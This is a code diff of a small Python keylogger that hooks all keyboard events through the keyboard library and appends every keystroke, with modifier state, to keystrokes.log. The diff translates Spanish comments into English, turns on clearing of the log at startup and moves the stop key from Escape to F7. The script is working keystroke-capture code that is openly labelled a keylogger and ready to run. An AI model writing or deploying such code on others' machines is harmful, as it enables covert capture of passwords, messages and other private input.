@@ -10,51 +10,39 @@ MAP = {
 }
 
 FILE_NAME = "keystrokes.log"
-CLEAR_ON_STARTUP = False
-TERMINATE_KEY = "esc"
+CLEAR_ON_STARTUP = True
+TERMINATE_KEY = "f7"
 
-def callback (output, is_down, event):
+def callback(output, is_down, event):
   if event.event_type in ("up", "down"):
     key = MAP.get(event.name, event.name)
     modifier = len(key) > 1
-    # Capturar unicamente los modificadores cuando estan saliendo presionados
-    if not modifier and event.event_type == "down":
+    if not modifier and event.event_type == "down": # Capture only modifiers when keys are pressed
       return
-    # Evitar escribir multiples veces la misma tecla si esta siendo presionada
-    if modifier:
+    if modifier: # Avoid typing the same key multiple times if it is being pressed
       if event.event_type == "down":
         if is_down.get(key, False):
           return
-        else:
-          is_down[key] = True
+        is_down[key] = True
       elif event.event_type == "up":
         is_down[key] = False
-      # Indicar si esta siendo presionada
-      key = " [{} ({})] ".format(key, event.event_type)
+      key = " [{} ({})] ".format(key, event.event_type) # Indicate if the key is being pressed
     elif key == "\r":
-      # Salto de linea
-      key = "\n"
-    # Escribir la tecla en el archivo de salida
-    output.write(key)
-    # Forzar escritura
-    output.flush()
+      key = "\n" # Line break
+    output.write(key) # Write the key to the output file
+    output.flush() # Force write
 
 def onexit(output):
   output.close()
 
 def main():
-  # Borrar el archivo previo
   if CLEAR_ON_STARTUP:
-    os.remove(FILE_NAME)
-  # Indica si una tecla esta siendo presionada
-  is_down = {}
-  # Archivo de salida
-  output = open(FILE_NAME, "a")
-  # Cerrar el archivo al terminar el programa
-  atexit.register(onexit, output)
-  # Instalar el registrador de teclas
-  keyboard.hook(partial(callback, output, is_down))
-  keyboard.wait(TERMINATE_KEY)
+    os.remove(FILE_NAME) # Delete the old file
+  is_down = {} # Indicates if a key is being pressed
+  output = open(FILE_NAME, "a") # Output file
+  atexit.register(onexit, output) # Close the file at the end of the program
+  keyboard.hook(partial(callback, output, is_down)) # Install the keylogger
+  keyboard.wait(TERMINATE_KEY) # Run until end key is pressed
 
 if __name__ == "__main__":
   main()
